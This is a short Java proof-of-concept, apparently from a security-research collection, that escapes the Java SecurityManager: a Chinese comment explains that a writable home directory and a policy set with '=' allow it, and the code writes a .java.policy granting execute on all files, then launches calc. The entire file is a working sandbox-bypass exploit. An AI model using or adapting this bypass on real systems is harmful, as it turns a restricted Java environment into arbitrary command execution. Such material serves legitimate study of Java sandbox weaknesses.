package bypass;

import java.io.FileWriter;
import java.io.IOException;

//如果启动参数是=指定，而不是==指定，且home路径可写
//grant{
//    permission java.io.FilePermission "C:\\Users\\Administrator\\*", "write";
//};
public class FileWrite {
    public static void main(String[] args) throws IOException {
        String property = System.getProperty("user.home");
        System.out.println(property);
        SecurityManager securityManager = new SecurityManager();
        System.setSecurityManager(securityManager);
        String homePolicyFile = "grant {\n    permission java.io.FilePermission \"<<ALL FILES>>\", \"execute\";\n};";
        FileWriter writer = new FileWriter("C:\\Users\\snowstorm-maxy\\.java.policy");
        writer.write(homePolicyFile);
        writer.close();
        Runtime.getRuntime().exec("calc");
    }


}
